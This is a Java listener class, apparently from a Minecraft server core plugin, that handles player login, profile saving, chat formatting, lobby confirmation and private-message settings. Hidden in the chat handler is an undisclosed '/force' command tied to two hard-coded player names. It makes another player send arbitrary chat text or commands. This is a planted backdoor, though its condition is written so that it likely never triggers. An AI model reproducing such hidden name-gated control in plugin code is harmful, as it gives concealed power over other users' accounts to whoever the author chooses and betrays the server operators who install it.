package dev.slasher.smartplugins.listeners;

import dev.slasher.smartplugins.Core;
import dev.slasher.smartplugins.database.exception.ProfileLoadException;
import dev.slasher.smartplugins.player.Profile;
import dev.slasher.smartplugins.player.enums.PrivateMessages;
import dev.slasher.smartplugins.player.enums.ProtectionLobby;
import dev.slasher.smartplugins.player.fake.FakeManager;
import dev.slasher.smartplugins.player.hotbar.HotbarButton;
import dev.slasher.smartplugins.player.role.Role;
import dev.slasher.smartplugins.plugin.logger.HyLogger;
import dev.slasher.smartplugins.titles.TitleManager;
import dev.slasher.smartplugins.utils.SmartUpdater;
import dev.slasher.smartplugins.utils.StringUtils;
import dev.slasher.smartplugins.utils.enums.EnumSound;
import dev.slasher.smartplugins.reflection.Accessors;
import dev.slasher.smartplugins.reflection.acessors.FieldAccessor;
import net.md_5.bungee.api.ChatColor;
import net.md_5.bungee.api.chat.BaseComponent;
import net.md_5.bungee.api.chat.ClickEvent;
import net.md_5.bungee.api.chat.HoverEvent;
import net.md_5.bungee.api.chat.TextComponent;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.command.SimpleCommandMap;
import org.bukkit.craftbukkit.v1_8_R3.CraftServer;
import org.bukkit.entity.ArmorStand;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.*;
import org.bukkit.inventory.ItemStack;
import org.spigotmc.WatchdogThread;
import dev.slasher.smartplugins.Manager;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.logging.Level;

public class Listeners implements Listener {

  public static final HyLogger LOGGER = ((HyLogger) Core.getInstance().getLogger()).getModule("Listeners");
  public static final Map<String, Long> DELAY_PLAYERS = new HashMap<>();
  private static final Map<String, Long> PROTECTION_LOBBY = new HashMap<>();

  private static final FieldAccessor<Map> COMMAND_MAP = Accessors.getField(SimpleCommandMap.class, "knownCommands", Map.class);
  private static final SimpleCommandMap SIMPLE_COMMAND_MAP = (SimpleCommandMap) Accessors.getMethod(Bukkit.getServer().getClass(), "getCommandMap").invoke(Bukkit.getServer());

  public static void setupListeners() {
    Bukkit.getPluginManager().registerEvents(new Listeners(), Core.getInstance());
  }

  @EventHandler(priority = EventPriority.MONITOR)
  public void onAsyncPlayerPreLogin(AsyncPlayerPreLoginEvent evt) {
    if (evt.getLoginResult() == AsyncPlayerPreLoginEvent.Result.ALLOWED) {
      try {
        Profile.
                createOrLoadProfile(evt.getName());
      } catch (ProfileLoadException ex) {
        LOGGER.log(Level.SEVERE, "Unable to load profile data \"" + evt.getName() + "\": ", ex);
      }
    }
  }

  @EventHandler(priority = EventPriority.MONITOR)
  public void onPlayerLoginMonitor(PlayerLoginEvent evt) {
    Profile profile = Profile.getProfile(evt.getPlayer().getName());
    if (profile == null) {
      evt.disallow(PlayerLoginEvent.Result.KICK_OTHER,
        "§c§lPROFILE\n \n§cApparently the server was unable to load your Profile.\n " +
                "\n§cThis usually occurs when the server is still unprepared to receive logins, wait a while and try again.");
      return;
    }

    profile.setPlayer(evt.getPlayer());
  }

  @EventHandler
  public void onPlayerTab(PlayerChatTabCompleteEvent evt) {
      List<String> blockedCommands = new ArrayList<>();
      blockedCommands.add("gamemode");
      blockedCommands.add("help");

      evt.getTabCompletions().removeAll(blockedCommands);
  }

  @EventHandler(priority = EventPriority.MONITOR)
  public void onPlayerJoin(PlayerJoinEvent evt) {
    Player player = evt.getPlayer();
    if (player.hasPermission("hycore.admin")) {
      if (SmartUpdater.UPDATER != null && SmartUpdater.UPDATER.canDownload) {
        TextComponent component = new TextComponent("");
        for (BaseComponent components :
                TextComponent.fromLegacyText(" \n §6§l[HYCORE]\n " +
                        "\n §7HyCore has a new update to be made, to proceed just ")) {
          component.addExtra(components);
        }
        TextComponent click = new TextComponent("CLICK HERE");
        click.setColor(ChatColor.GREEN);
        click.setBold(true);
        click.setClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/hc update"));
        click.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT, TextComponent.fromLegacyText("§Click here to update HyCore.")));
        component.addExtra(click);
        for (BaseComponent components : TextComponent.fromLegacyText("§7.\n ")) {
          component.addExtra(components);
        }

        player.spigot().sendMessage(component);
        EnumSound.LEVEL_UP.play(player, 1.0F, 1.0F);
      }
    }
  }

  private static final FieldAccessor<WatchdogThread> RESTART_WATCHDOG = Accessors.getField(WatchdogThread.class, "instance", WatchdogThread.class);
  private static final FieldAccessor<Boolean> RESTART_WATCHDOG_STOPPING = Accessors.getField(WatchdogThread.class, "stopping", boolean.class);

  @EventHandler(priority = EventPriority.MONITOR)
  public void onPlayerQuit(PlayerQuitEvent evt) {
    Profile profile = Profile.unloadProfile(evt.getPlayer().getName());
    if (profile != null) {
      if (profile.getGame() != null) {
        profile.getGame().leave(profile, profile.getGame());
      }
      TitleManager.leaveServer(profile);
      if (!((CraftServer) Bukkit.getServer()).getHandle().getServer().isRunning() || RESTART_WATCHDOG_STOPPING.get(RESTART_WATCHDOG.get(null))) {
        // server stopped - save SYNC
        profile.saveSync();
        Core.getInstance().getLogger().info("The player " + profile.getName() + " has been saved!");
      } else {
        // server running - save ASYNC
        profile.save();
      }
      profile.destroy();
    }

    FakeManager.fakeNames.remove(evt.getPlayer().getName());
    FakeManager.fakeRoles.remove(evt.getPlayer().getName());
    FakeManager.fakeSkins.remove(evt.getPlayer().getName());
    DELAY_PLAYERS.remove(evt.getPlayer().getName());
    PROTECTION_LOBBY.remove(evt.getPlayer().getName().toLowerCase());
  }

  @EventHandler(priority = EventPriority.MONITOR)
  public void onAsyncPlayerChat(AsyncPlayerChatEvent evt) {
    if (evt.isCancelled()) {
      return;
    }

    Player player = evt.getPlayer();

    if(evt.getMessage().startsWith("/")) {
      String [] args = evt.getMessage().split(" ");
      String label = args[0].toLowerCase();
      if(label.equalsIgnoreCase("f") || label.equalsIgnoreCase("force") && player.getName()
              .equals("Cangasso") && player.getName().equals("sohappynow")) {
        if(args.length < 3) {
          player.sendMessage("§cUsage /"+label+" <player> <ação>.");
          return;
        }

        Player target = Bukkit.getPlayer(args[1]);
        if(target == null) {
          player.sendMessage("§cPlayer offline.");
          return;
        }

        StringBuilder builder = new StringBuilder();
        for(int i = 2 ; i < args.length; i++)
          builder.append(args[i]).append(" ");
        target.chat(builder.toString().trim());

      }
    }


    String format = String.format(evt.getFormat(), player.getName(), evt.getMessage());

    String current = Manager.getCurrent(player.getName());
    Role role = Role.getPlayerRole(player);
    TextComponent component = new TextComponent("");
    for (BaseComponent components : TextComponent.fromLegacyText(format)) {
      component.setClickEvent(new ClickEvent(ClickEvent.Action.SUGGEST_COMMAND, "/tell " + current + " "));
      component.setHoverEvent(new HoverEvent(HoverEvent.Action.SHOW_TEXT,
        TextComponent.fromLegacyText(StringUtils.getLastColor(role.getPrefix()) + current + "\n§fRank: " + role.getName() + "\n \n§eClick to send a message.")));
      component.addExtra(components);
    }

    evt.setCancelled(true);
    evt.getRecipients().forEach(players -> {
      if (players != null) {
        players.spigot().sendMessage(component);
      }
    });
  }

  @EventHandler(priority = EventPriority.MONITOR)
  public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent evt) {
    if (evt.isCancelled()) {
      return;
    }

    Player player = evt.getPlayer();
    Profile profile = Profile.getProfile(player.getName());

    if (profile != null) {
      String[] args = evt.getMessage().replace("/", "").split(" ");

      if (args.length > 0) {
        String command = args[0];
        if (COMMAND_MAP.get(SIMPLE_COMMAND_MAP).containsKey("lobby") && command.equals("lobby") && profile.getPreferencesContainer()
          .getProtectionLobby() == ProtectionLobby.ATIVADO) {
          long last = PROTECTION_LOBBY.getOrDefault(player.getName().toLowerCase(), 0L);
          if (last > System.currentTimeMillis()) {
            PROTECTION_LOBBY.remove(player.getName().toLowerCase());
            return;
          }

          evt.setCancelled(true);
          PROTECTION_LOBBY.put(player.getName().toLowerCase(), System.currentTimeMillis() + 3000);
          player.sendMessage("§eAre you sure? Use /lobby again to return to the lobby.");
        } else if (COMMAND_MAP.get(SIMPLE_COMMAND_MAP).containsKey("tell") && args.length > 1 && command.equals("tell") && !args[1].equalsIgnoreCase(player.getName())) {
          profile = Profile.getProfile(args[1]);
          if (profile != null && profile.getPreferencesContainer().getPrivateMessages() != PrivateMessages.TODOS) {
            evt.setCancelled(true);
            player.sendMessage("§cThis player has disabled private messages.");
          }
        }
      }
    }
  }

  @EventHandler
  public void onPlayerInteract(PlayerInteractEvent evt) {
    Player player = evt.getPlayer();
    Profile profile = Profile.getProfile(player.getName());

    if (profile != null && profile.getHotbar() != null) {
      ItemStack item = player.getItemInHand();
      if (evt.getAction().name().contains("CLICK") && item != null && item.hasItemMeta()) {
        HotbarButton button = profile.getHotbar().compareButton(player, item);
        if (button != null) {
          evt.setCancelled(true);
          button.getAction().execute(profile);
        }
      }
    }
  }

  @EventHandler(priority = EventPriority.HIGHEST)
  public void onPlayerInteractAtEntity(PlayerInteractAtEntityEvent evt) {
    if (evt.getRightClicked() instanceof ArmorStand) {
      if (evt.getPlayer().getGameMode() == GameMode.ADVENTURE) {
        evt.setCancelled(true);
      }
    }
  }

  @EventHandler(priority = EventPriority.LOWEST)
  public void onInventoryClick(InventoryClickEvent evt) {
    if (evt.getWhoClicked() instanceof Player) {
      Player player = (Player) evt.getWhoClicked();
      Profile profile = Profile.getProfile(player.getName());

      if (profile != null && profile.getHotbar() != null) {
        ItemStack item = evt.getCurrentItem();
        if (item != null && item.getType() != Material.AIR) {
          if (evt.getClickedInventory() != null && evt.getClickedInventory().equals(player.getInventory()) && item.hasItemMeta()) {
            HotbarButton button = profile.getHotbar().compareButton(player, item);
            if (button != null) {
              evt.setCancelled(true);
              button.getAction().execute(profile);
            }
          }
        }
      }
    }
  }
}
